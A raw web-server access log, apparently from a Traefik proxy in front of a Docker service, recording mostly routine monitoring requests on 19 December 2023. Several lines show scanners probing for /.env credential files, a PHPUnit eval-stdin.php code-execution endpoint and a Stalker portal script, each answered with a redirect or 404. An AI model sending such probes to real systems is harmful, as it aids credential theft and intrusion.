167.71.120.76 - - [19/Dec/2023:06:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8489 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8490 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8491 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8492 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8493 "www@docker" "http://172.18.0.9:80" 1ms
45.142.182.77 - - [19/Dec/2023:06:03:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8494 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:06:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8495 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8496 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8497 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8498 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8499 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8500 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8501 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8502 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8503 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8504 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8505 "www@docker" "http://172.18.0.9:80" 1ms
54.37.79.75 - - [19/Dec/2023:06:08:22 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8506 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:06:08:22 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8507 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:06:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8508 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8509 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8510 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8511 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:10:25 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2327 "-" "-" 8512 "www@docker" "http://172.18.0.9:80" 47ms
167.71.120.76 - - [19/Dec/2023:06:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8513 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:06:10:48 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2378 "-" "-" 8514 "www@docker" "http://172.18.0.9:80" 26ms
159.203.109.206 - - [19/Dec/2023:06:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8515 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:06:11:25 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2433 "-" "-" 8516 "www@docker" "http://172.18.0.9:80" 28ms
167.71.120.76 - - [19/Dec/2023:06:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8517 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:11:39 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2484 "-" "-" 8518 "www@docker" "http://172.18.0.9:80" 24ms
173.48.140.140 - - [19/Dec/2023:06:11:49 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2539 "-" "-" 8519 "www@docker" "http://172.18.0.9:80" 20ms
99.255.56.147 - - [19/Dec/2023:06:11:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8520 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:06:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8521 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8522 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:06:13:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8523 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:06:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8524 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8525 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:14:05 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2639 "-" "-" 8526 "www@docker" "http://172.18.0.9:80" 60ms
159.203.109.206 - - [19/Dec/2023:06:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8527 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8528 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:15:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8529 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:06:15:01 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8530 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8531 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8532 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:15:39 +0000] "GET /logs HTTP/2.0" 301 169 "-" "-" 8533 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:15:39 +0000] "GET /logs/ HTTP/1.1" 301 17 "-" "-" 8534 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:06:15:39 +0000] "GET /logs/ HTTP/2.0" 200 2472 "-" "-" 8535 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:06:15:39 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 8536 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:06:15:39 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2601 "-" "-" 8537 "www@docker" "http://172.18.0.9:80" 35ms
173.48.140.140 - - [19/Dec/2023:06:15:54 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2652 "-" "-" 8538 "www@docker" "http://172.18.0.9:80" 21ms
159.203.109.206 - - [19/Dec/2023:06:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8539 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8540 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8541 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:17:29 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2708 "-" "-" 8542 "www@docker" "http://172.18.0.9:80" 34ms
167.71.120.76 - - [19/Dec/2023:06:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8543 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8544 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:06:18:22 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2708 "-" "-" 8545 "www@docker" "http://172.18.0.9:80" 20ms
205.210.31.26 - - [19/Dec/2023:06:18:25 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 8546 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:06:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8547 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8548 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8549 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8550 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8551 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8552 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8553 "www@docker" "http://172.18.0.9:80" 0ms
35.240.121.17 - - [19/Dec/2023:06:21:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8554 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:06:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8555 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8556 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8557 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8558 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8559 "www@docker" "http://172.18.0.9:80" 0ms
164.52.0.94 - - [19/Dec/2023:06:24:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8560 "-" "-" 0ms
164.52.0.94 - - [19/Dec/2023:06:24:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8561 "-" "-" 0ms
164.52.0.94 - - [19/Dec/2023:06:24:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8562 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:06:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8563 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8564 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8565 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8566 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8567 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8568 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8569 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8570 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8571 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8572 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8573 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8574 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8575 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8576 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8577 "www@docker" "http://172.18.0.9:80" 1ms
84.247.102.13 - - [19/Dec/2023:06:31:36 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8578 "web-to-websecure@internal" "-" 0ms
84.247.102.13 - - [19/Dec/2023:06:31:37 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8579 "web-to-websecure@internal" "-" 0ms
84.247.102.13 - - [19/Dec/2023:06:31:39 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 8580 "-" "-" 0ms
84.247.102.13 - - [19/Dec/2023:06:31:40 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 8581 "-" "-" 0ms
84.247.102.13 - - [19/Dec/2023:06:31:42 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 17 "-" "-" 8582 "web-to-websecure@internal" "-" 0ms
84.247.102.13 - - [19/Dec/2023:06:31:44 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 19 "-" "-" 8583 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:06:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8584 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8585 "www@docker" "http://172.18.0.9:80" 17ms
159.203.109.206 - - [19/Dec/2023:06:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8586 "www@docker" "http://172.18.0.9:80" 2ms
167.71.120.76 - - [19/Dec/2023:06:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8587 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8588 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8589 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8590 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8591 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8592 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8593 "www@docker" "http://172.18.0.9:80" 0ms
167.71.38.185 - - [19/Dec/2023:06:36:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8594 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:06:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8595 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8596 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8597 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8598 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8599 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8600 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8601 "www@docker" "http://172.18.0.9:80" 0ms
180.149.125.172 - - [19/Dec/2023:06:40:32 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 301 17 "-" "-" 8602 "web-to-websecure@internal" "-" 0ms
180.149.125.172 - - [19/Dec/2023:06:40:33 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 19 "-" "-" 8603 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:06:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8604 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8605 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8606 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8607 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8608 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8609 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8610 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8611 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8612 "www@docker" "http://172.18.0.9:80" 0ms
138.197.90.25 - - [19/Dec/2023:06:44:37 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8613 "web-to-websecure@internal" "-" 0ms
138.197.90.25 - - [19/Dec/2023:06:44:37 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 8614 "-" "-" 0ms
138.197.90.25 - - [19/Dec/2023:06:44:37 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 8615 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:06:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8616 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8617 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8618 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8619 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8620 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8621 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8622 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8623 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [19/Dec/2023:06:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8624 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8625 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8626 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8627 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8628 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8629 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8630 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8631 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8632 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8633 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8634 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8635 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8636 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8637 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8638 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8639 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:06:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8640 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8641 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8642 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:06:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8643 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8644 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:06:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8645 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8646 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8647 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8648 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8649 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:07:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8650 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8651 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8652 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8653 "www@docker" "http://172.18.0.9:80" 1ms
94.102.61.10 - - [19/Dec/2023:07:04:06 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8654 "web-to-websecure@internal" "-" 0ms
94.102.61.10 - - [19/Dec/2023:07:04:08 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8655 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:07:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8656 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8657 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8658 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8659 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8660 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8661 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8662 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8663 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8664 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8665 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8666 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:07:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8667 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:07:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8668 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:07:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8669 "www@docker" "http://172.18.0.9:80" 1ms
162.216.150.100 - - [19/Dec/2023:07:11:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8670 "-" "-" 0ms
